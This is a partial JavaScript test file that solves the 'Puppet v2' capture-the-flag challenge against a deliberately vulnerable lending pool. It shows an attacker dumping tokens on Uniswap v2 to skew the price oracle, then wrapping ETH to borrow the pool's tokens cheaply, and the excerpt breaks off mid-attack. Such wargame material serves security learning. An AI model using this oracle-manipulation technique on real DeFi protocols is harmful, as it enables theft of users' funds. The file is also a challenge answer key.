...
describe("[Challenge] Puppet v2", function () {
  ...
  it("Exploit", async function () {
    ...
    // 1. calculate amount of ETH you will get by doing the swap
    const amountOutMin = await this.uniswapRouter.getAmountOut(
    ...
    // 2. approve the token to uniswap v2 pool
    await this.token
      .connect(attacker)
      .approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
    // 3. swap the DVT token into ETH
    await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
      ATTACKER_INITIAL_TOKEN_BALANCE,
      amountOutMin,
      [this.token.address, this.weth.address], // [tokenIn, tokenOut]
      attacker.address,
      deadline
    );
    // 4. calculate amount of WETH required to borrow all DVT tokens from lending pool
    const requiredWeth = await this.lendingPool.calculateDepositOfWETHRequired(
      POOL_INITIAL_TOKEN_BALANCE
    );

    // 5. change ETH -> WETH
    const ethBalance = await ethers.provider.getBalance(attacker.address);
    expect(requiredWeth).to.be.lt(ethBalance);
    await this.weth.connect(attacker).deposit({ value: requiredWeth });

    // 6. approve lending pool to use attacker WETH
    await this.weth
      .connect(attacker)
      .approve(this.lendingPool.address, requiredWeth);
    // 7. borrow all the DVT token from the pool
